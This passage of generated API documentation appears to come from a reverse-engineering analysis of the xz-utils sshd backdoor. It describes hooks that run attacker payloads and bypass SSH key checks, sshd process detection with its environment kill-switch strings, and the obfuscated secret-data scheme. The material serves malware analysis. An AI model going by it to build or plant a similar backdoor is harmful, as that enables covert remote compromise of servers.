<dl class="section return"><dt>Returns</dt><dd>int </dd></dl>

</div>
</div>
<a id="a8ce260e9315b4afa70668391058ed484"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a8ce260e9315b4afa70668391058ed484">&#9670;&nbsp;</a></span>mm_answer_keyallowed_hook()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">int mm_answer_keyallowed_hook </td>
          <td>(</td>
          <td class="paramtype">struct ssh *&#160;</td>
          <td class="paramname"><em>ssh</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">int&#160;</td>
          <td class="paramname"><em>sock</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">struct sshbuf *&#160;</td>
          <td class="paramname"><em>m</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>runs the payload received from <a class="el" href="xzre_8h.html#a60b93ed64ba904012e9fa9477e97a244">sshd_proxy_elevate</a>, and then runs the original <code>mm_answer_keyallowed</code> function </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">ssh</td><td></td></tr>
    <tr><td class="paramname">sock</td><td></td></tr>
    <tr><td class="paramname">m</td><td></td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>int </dd></dl>

</div>
</div>
<a id="a99eb76809c798f3bcae98526992e63ef"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a99eb76809c798f3bcae98526992e63ef">&#9670;&nbsp;</a></span>mm_answer_keyverify_hook()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">int mm_answer_keyverify_hook </td>
          <td>(</td>
          <td class="paramtype">struct ssh *&#160;</td>
          <td class="paramname"><em>ssh</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">int&#160;</td>
          <td class="paramname"><em>sock</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">struct sshbuf *&#160;</td>
          <td class="paramname"><em>m</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>used in conjunction with <a class="el" href="xzre_8h.html#a8ce260e9315b4afa70668391058ed484">mm_answer_keyallowed_hook</a> to bypass the key validity check </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">ssh</td><td></td></tr>
    <tr><td class="paramname">sock</td><td></td></tr>
    <tr><td class="paramname">m</td><td></td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>int </dd></dl>

</div>
</div>
<a id="a096fbb5b183337e44012a38910ea31eb"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a096fbb5b183337e44012a38910ea31eb">&#9670;&nbsp;</a></span>mm_log_handler_hook()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">void mm_log_handler_hook </td>
          <td>(</td>
          <td class="paramtype">LogLevel&#160;</td>
          <td class="paramname"><em>level</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">int&#160;</td>
          <td class="paramname"><em>forced</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">const char *&#160;</td>
          <td class="paramname"><em>msg</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">void *&#160;</td>
          <td class="paramname"><em>ctx</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">level</td><td></td></tr>
    <tr><td class="paramname">forced</td><td></td></tr>
    <tr><td class="paramname">msg</td><td></td></tr>
    <tr><td class="paramname">ctx</td><td></td></tr>
  </table>
  </dd>
</dl>

</div>
</div>
<a id="a04a9f7dfab9ccac6d8407c906b7b2e2e"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a04a9f7dfab9ccac6d8407c906b7b2e2e">&#9670;&nbsp;</a></span>process_is_sshd()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL process_is_sshd </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="structelf__info.html">elf_info_t</a> *&#160;</td>
          <td class="paramname"><em>elf</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>stack_end</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>checks if the current process is sshd by inspecting <code>argv</code> and <code>envp</code>. </p>
<p>this is done by reading the top of the process stack ( represented by <code>stack_end</code> )</p>
<p>The following checks are performed:</p><ul>
<li>that argv[0] is "/usr/sbin/sshd"</li>
<li>the remaining args all start with '-'</li>
<li>the args do not contain the '-d' or '-D' flags (which set sshd into debug or non-daemon mode)</li>
<li>that there is not any '\t' or '=' characters in the args</li>
<li>the environment variable strings do not start with any string from the encoded string table</li>
</ul>
<p>In particular these environment strings:</p><ul>
<li>"DISPLAY="</li>
<li>"LD_AUDIT="</li>
<li>"LD_BIND_NOT="</li>
<li>"LD_DEBUG="</li>
<li>"LD_PROFILE="</li>
<li>"LD_USE_LOAD_BIAS="</li>
<li>"LINES="</li>
<li>"TERM="</li>
<li>"WAYLAND_DISPLAY="</li>
<li>"yolAbejyiejuvnup=Evjtgvsh5okmkAvj"</li>
</ul>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">elf</td><td>the main ELF context </td></tr>
    <tr><td class="paramname">stack_end</td><td>pointer to the top of the process stack, also known as <code>__libc_stack_end</code> </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if the process is <code>sshd</code>, FALSE otherwise </dd></dl>

</div>
</div>
<a id="a1cb8bb283baa56567d7b88b5fcfe7db7"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a1cb8bb283baa56567d7b88b5fcfe7db7">&#9670;&nbsp;</a></span>process_shared_libraries()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL process_shared_libraries </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="structbackdoor__shared__libraries__data.html">backdoor_shared_libraries_data_t</a> *&#160;</td>
          <td class="paramname"><em>data</em></td><td>)</td>
          <td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>scans loaded libraries to identify interesting libraries </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">data</td><td>input data for the function (will be duplicated, internally) </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if successful, FALSE otherwise </dd></dl>

</div>
</div>
<a id="a1fcba1b3d069ccf76ee3cef4a3b9a682"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a1fcba1b3d069ccf76ee3cef4a3b9a682">&#9670;&nbsp;</a></span>process_shared_libraries_map()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL process_shared_libraries_map </td>
          <td>(</td>
          <td class="paramtype">struct link_map *&#160;</td>
          <td class="paramname"><em>r_map</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structbackdoor__shared__libraries__data.html">backdoor_shared_libraries_data_t</a> *&#160;</td>
          <td class="paramname"><em>data</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>scans loaded libraries to identify interesting libraries and populate related data </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">r_map</td><td>the linked list of loaded libraries obtained from <code>r_debug</code> </td></tr>
    <tr><td class="paramname">data</td><td>pointer to data that will be populated by the function </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if successful, FALSE otherwise </dd></dl>

</div>
</div>
<a id="a0d70747b6216270de07c783fc499938e"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a0d70747b6216270de07c783fc499938e">&#9670;&nbsp;</a></span>resolve_libc_imports()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL resolve_libc_imports </td>
          <td>(</td>
          <td class="paramtype">struct link_map *&#160;</td>
          <td class="paramname"><em>libc</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structelf__info.html">elf_info_t</a> *&#160;</td>
          <td class="paramname"><em>libc_info</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structlibc__imports.html">libc_imports_t</a> *&#160;</td>
          <td class="paramname"><em>imports</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>parses the libc ELF from the supplied link map, and resolves its imports </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">libc</td><td>the loaded libc's link map (obtained by traversing r_debug-&gt;r_map) </td></tr>
    <tr><td class="paramname">libc_info</td><td>pointer to an ELF context that will be populated with the parsed ELF information </td></tr>
    <tr><td class="paramname">imports</td><td>pointer to libc imports that will be populated with resolved libc function pointers </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if successful, FALSE otherwise </dd></dl>

</div>
</div>
<a id="a642b0366b943daba60d004a6a46fb7c7"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a642b0366b943daba60d004a6a46fb7c7">&#9670;&nbsp;</a></span>rsa_key_hash()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL rsa_key_hash </td>
          <td>(</td>
          <td class="paramtype">const RSA *&#160;</td>
          <td class="paramname"><em>rsa</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>mdBuf</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u64&#160;</td>
          <td class="paramname"><em>mdBufSize</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structimported__funcs.html">imported_funcs_t</a> *&#160;</td>
          <td class="paramname"><em>funcs</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>obtains a SHA256 hash of the supplied RSA key </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">rsa</td><td>the RSA key to hash </td></tr>
    <tr><td class="paramname">mdBuf</td><td>buffer to write the resulting digest to </td></tr>
    <tr><td class="paramname">mdBufSize</td><td>size of the buffer indicated by <code>mdBuf</code> </td></tr>
    <tr><td class="paramname">funcs</td><td></td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if the hash was successfully generated, FALSE otherwise </dd></dl>

</div>
</div>
<a id="add930f2364d6ac0711ec484781f00f03"></a>
<h2 class="memtitle"><span class="permalink"><a href="#add930f2364d6ac0711ec484781f00f03">&#9670;&nbsp;</a></span>run_backdoor_commands()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL run_backdoor_commands </td>
          <td>(</td>
          <td class="paramtype">RSA *&#160;</td>
          <td class="paramname"><em>key</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structglobal__context.html">global_context_t</a> *&#160;</td>
          <td class="paramname"><em>ctx</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">BOOL *&#160;</td>
          <td class="paramname"><em>do_orig</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>checks if the supplied RSA public key contains the backdoor commands, and executes them if present. </p>
<p>this function is called from function hooks. the output parameter <code>do_orig</code> will indicate to the caller if the original function should be invoked or not</p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">key</td><td>the public RSA key to check </td></tr>
    <tr><td class="paramname">ctx</td><td>the global context, used for the secret data (chacha key) </td></tr>
    <tr><td class="paramname">do_orig</td><td>output variable. will contain TRUE if the original function should be invoked, FALSE otherwise. </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if backdoor commands were invoked, FALSE otherwise </dd></dl>

</div>
</div>
<a id="aa7239c834d2598747c9158949280783b"></a>
<h2 class="memtitle"><span class="permalink"><a href="#aa7239c834d2598747c9158949280783b">&#9670;&nbsp;</a></span>secret_data_append_from_address()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL secret_data_append_from_address </td>
          <td>(</td>
          <td class="paramtype">void *&#160;</td>
          <td class="paramname"><em>addr</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="unionsecret__data__shift__cursor__t.html">secret_data_shift_cursor_t</a>&#160;</td>
          <td class="paramname"><em>shift_cursor</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">unsigned&#160;</td>
          <td class="paramname"><em>shift_count</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">unsigned&#160;</td>
          <td class="paramname"><em>operation_index</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>calls <a class="el" href="xzre_8h.html#a48636f910a9c7df2f2adfa4abf7a73e9">secret_data_append_singleton</a> with either the given code address or the return address, if <code>addr</code> is &lt;= 1 </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">addr</td><td>the code address to use for the verification. NULL to use the return address </td></tr>
    <tr><td class="paramname">shift_cursor</td><td>the initial shift index </td></tr>
    <tr><td class="paramname">shift_count</td><td>how many '1' bits to shift </td></tr>
    <tr><td class="paramname">operation_index</td><td>identification for this shift operation </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL </dd></dl>

</div>
</div>
<a id="ace528f88c27d645eafff5052f6c36bd0"></a>
<h2 class="memtitle"><span class="permalink"><a href="#ace528f88c27d645eafff5052f6c36bd0">&#9670;&nbsp;</a></span>secret_data_append_from_call_site()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL secret_data_append_from_call_site </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="unionsecret__data__shift__cursor__t.html">secret_data_shift_cursor_t</a>&#160;</td>
          <td class="paramname"><em>shift_cursor</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">unsigned&#160;</td>
          <td class="paramname"><em>shift_count</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">unsigned&#160;</td>
          <td class="paramname"><em>operation_index</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">BOOL&#160;</td>
          <td class="paramname"><em>bypass</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Shifts data in the secret data store, after validation of the call site, i.e. the caller of this function for more details, see <a class="el" href="xzre_8h.html#a48636f910a9c7df2f2adfa4abf7a73e9">secret_data_append_singleton</a>. </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">shift_cursor</td><td>the initial shift index </td></tr>
    <tr><td class="paramname">shift_count</td><td>number of '1' bits to shift </td></tr>
    <tr><td class="paramname">operation_index</td><td>index/id of shit shift operation </td></tr>
    <tr><td class="paramname">bypass</td><td>forces the result to be TRUE, evne if validation failed </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if validation was successful and data was added, FALSE otherwise </dd></dl>

</div>
</div>
<a id="ad595372eac746eb11ddc536e5a20d667"></a>
<h2 class="memtitle"><span class="permalink"><a href="#ad595372eac746eb11ddc536e5a20d667">&#9670;&nbsp;</a></span>secret_data_append_from_code()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL secret_data_append_from_code </td>
          <td>(</td>
          <td class="paramtype">void *&#160;</td>
          <td class="paramname"><em>code_start</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">void *&#160;</td>
          <td class="paramname"><em>code_end</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="unionsecret__data__shift__cursor__t.html">secret_data_shift_cursor_t</a>&#160;</td>
          <td class="paramname"><em>shift_cursor</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">unsigned&#160;</td>
          <td class="paramname"><em>shift_count</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">BOOL&#160;</td>
          <td class="paramname"><em>start_from_call</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Pushes secret data by validating the given code block. </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">code_start</td><td>pointer to the beginning of code/function to analyze </td></tr>
    <tr><td class="paramname">code_end</td><td>pointer to the end of code/function to analyze </td></tr>
    <tr><td class="paramname">shift_cursor</td><td>shift index </td></tr>
    <tr><td class="paramname">shift_count</td><td>how many '1' bits to shift </td></tr>
    <tr><td class="paramname">start_from_call</td><td>TRUE if analysis should begin from the first CALL instruction FALSE to start from the first instruction </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if all requested shifts were all executed. FALSE if some shift wasn't executed due to code validation failure. </dd></dl>

</div>
</div>
<a id="a2e827c4d8e3500f106150e786053dde2"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a2e827c4d8e3500f106150e786053dde2">&#9670;&nbsp;</a></span>secret_data_append_item()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL secret_data_append_item </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="unionsecret__data__shift__cursor__t.html">secret_data_shift_cursor_t</a>&#160;</td>
          <td class="paramname"><em>shift_cursor</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">unsigned&#160;</td>
          <td class="paramname"><em>operation_index</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">unsigned&#160;</td>
          <td class="paramname"><em>shift_count</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">int&#160;</td>
          <td class="paramname"><em>index</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Calls <a class="el" href="xzre_8h.html#a48636f910a9c7df2f2adfa4abf7a73e9">secret_data_append_singleton</a>, if <code>flags</code> are non-zero. </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">shift_cursor</td><td>the initial shift index </td></tr>
    <tr><td class="paramname">operation_index</td><td>identification for this shift operation </td></tr>
    <tr><td class="paramname">shift_count</td><td>how many '1' bits to shift </td></tr>
    <tr><td class="paramname">index</td><td>must be non-zero in order for the operation to be executed </td></tr>
    <tr><td class="paramname">code</td><td>pointer to code that will be checked by the function, to "authorize" the data load </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if validation was successful and data was added, FALSE otherwise </dd></dl>

</div>
</div>
<a id="aa80510b3b8c22dc0ccf6e123c393fb3d"></a>
<h2 class="memtitle"><span class="permalink"><a href="#aa80510b3b8c22dc0ccf6e123c393fb3d">&#9670;&nbsp;</a></span>secret_data_append_items()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL secret_data_append_items </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="structsecret__data__item.html">secret_data_item_t</a> *&#160;</td>
          <td class="paramname"><em>items</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u64&#160;</td>
          <td class="paramname"><em>items_count</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">BOOL(*)(<a class="el" href="unionsecret__data__shift__cursor__t.html">secret_data_shift_cursor_t</a>, unsigned, unsigned, int, u8 *)&#160;</td>
          <td class="paramname"><em>appender</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>appends multiple secret data items at once </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">items</td><td>items to append </td></tr>
    <tr><td class="paramname">items_count</td><td>number of items to append </td></tr>
    <tr><td class="paramname">appender</td><td><a class="el" href="xzre_8h.html#a2e827c4d8e3500f106150e786053dde2">secret_data_append_item</a> </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if all items have been appended successfully, FALSE otherwise </dd></dl>

</div>
</div>
<a id="a48636f910a9c7df2f2adfa4abf7a73e9"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a48636f910a9c7df2f2adfa4abf7a73e9">&#9670;&nbsp;</a></span>secret_data_append_singleton()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL secret_data_append_singleton </td>
          <td>(</td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>call_site</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="unionsecret__data__shift__cursor__t.html">secret_data_shift_cursor_t</a>&#160;</td>
          <td class="paramname"><em>shift_cursor</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">unsigned&#160;</td>
          <td class="paramname"><em>shift_count</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">unsigned&#160;</td>
          <td class="paramname"><em>operation_index</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Shifts data in the secret data store, after validation of <code>code</code>. this function is intended to be invoked only once for each <code>operation_index</code> value. <code>operation_index</code> will be used as an index into a global array of flags, so that multiple calls with the same value will be a NO-OP. </p>
<p>the <code>code</code> will be verified to check if the shift operation should be allowed or not. the algorithm will:</p><ul>
<li>locate the beginning of the function, by scanning for the <code>endbr64</code> instruction and making sure that the code lies between a pre-defined code range (set in <a class="el" href="xzre_8h.html#a229ee0bd4111363061bc4230bc1f6423">backdoor_setup</a> from <a class="el" href="xzre_8h.html#a18845fc4614f60083817db417dc32a13">elf_get_code_segment</a>)</li>
<li>search for <code>shift_count</code> number of "reg2reg" instructions (explained below)</li>
<li>for each instruction, shift a '1' in the data register, and increment the shift cursor to the next bit index the code only considers reg2reg instruction. other instructions are skipped. the function will return TRUE if the number of shifts executed == number of wanted shifts (that is, if there are as many compatible reg2reg instructions as the number of requested shifts) NOTE: MOV instructions are counted, but don't cause any shift (they are skipped).</li>
</ul>
<p>a reg2reg instruction is an x64 instruction with one of the following characteristics:</p><ul>
<li>primary opcode of 0x89 (MOV) or 0x3B (CMP) or, alternatively, an opcode that passes the following validation opcode_check = opcode - 0x83; if ( opcode_check &gt; 0x2E || ((0x410100000101 &gt;&gt; opcode_value) &amp; 1) == 0 )</li>
</ul>
<p>additionally, checks outlined in <a class="el" href="xzre_8h.html#aed0391d07e4413f5a13e1ec2940c94ea">find_reg2reg_instruction</a> must also pass NOTE: the opcode in 'opcode' is the actual opcode +0x80 TODO: inspect x64 manual to find the exact filter</p>
<p>if <code>call_site</code> is supplied, a preliminary check will be conducted to see if the caller function contains a CALL-relative instruction. several functions have a CALL in the prologue which serves a dual purpose:</p><ul>
<li>push more data in the secret data store</li>
<li>check if the call is authorized (the code is in the authorized range, and starts with a CALL-relative instruction)</li>
</ul>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">call_site</td><td>if supplied, it will be checked if it contains a valid CALL-relative instruction </td></tr>
    <tr><td class="paramname">code</td><td>pointer to code that will be checked by the function, to "authorize" the data load </td></tr>
    <tr><td class="paramname">shift_cursor</td><td>the initial shift index </td></tr>
    <tr><td class="paramname">shift_count</td><td>number of '1' bits to shift, represented by the number of"reg2reg" instructions expected in the function pointed to by <code>code</code> </td></tr>
    <tr><td class="paramname">operation_index</td><td>index/id of shit shift operation </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if all requested shifts were all executed. FALSE if some shift wasn't executed due to code validation failure. </dd></dl>

</div>
</div>
<a id="a80592f231ad06e5a8ba204e6ff685827"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a80592f231ad06e5a8ba204e6ff685827">&#9670;&nbsp;</a></span>secret_data_get_decrypted()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL secret_data_get_decrypted </td>
          <td>(</td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>output</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structglobal__context.html">global_context_t</a> *&#160;</td>
          <td class="paramname"><em>ctx</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>obtains a decrypted copy of the secret data </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">output</td><td>output buffer that will receive the decrypted data </td></tr>
    <tr><td class="paramname">ctx</td><td>the global context (for secret data and function imports) </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if successful, FALSE otherwise </dd></dl>

</div>
</div>
<a id="a3a3417b7999e13c79b9411e092923278"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a3a3417b7999e13c79b9411e092923278">&#9670;&nbsp;</a></span>sha256()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL sha256 </td>
          <td>(</td>
          <td class="paramtype">const void *&#160;</td>
          <td class="paramname"><em>data</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">size_t&#160;</td>
          <td class="paramname"><em>count</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>mdBuf</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u64&#160;</td>
          <td class="paramname"><em>mdBufSize</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structimported__funcs.html">imported_funcs_t</a> *&#160;</td>
          <td class="paramname"><em>funcs</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>computes the SHA256 hash of the supplied data </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">data</td><td>buffer containing the data to hash </td></tr>
    <tr><td class="paramname">count</td><td>number of bytes to hash from <code>data</code> </td></tr>
    <tr><td class="paramname">mdBuf</td><td>buffer to write the resulting digest to </td></tr>
    <tr><td class="paramname">mdBufSize</td><td>size of the buffer indicated by <code>mdBuf</code> </td></tr>
    <tr><td class="paramname">funcs</td><td></td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL </dd></dl>

</div>
</div>
<a id="ae4488f858b97dc690b41cf9a5d20ef44"></a>
<h2 class="memtitle"><span class="permalink"><a href="#ae4488f858b97dc690b41cf9a5d20ef44">&#9670;&nbsp;</a></span>sshbuf_bignum_is_negative()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL sshbuf_bignum_is_negative </td>
          <td>(</td>
          <td class="paramtype">struct sshbuf *&#160;</td>
          <td class="paramname"><em>buf</em></td><td>)</td>
          <td></td>
        </tr>
      </table>
</div><div class="memdoc">

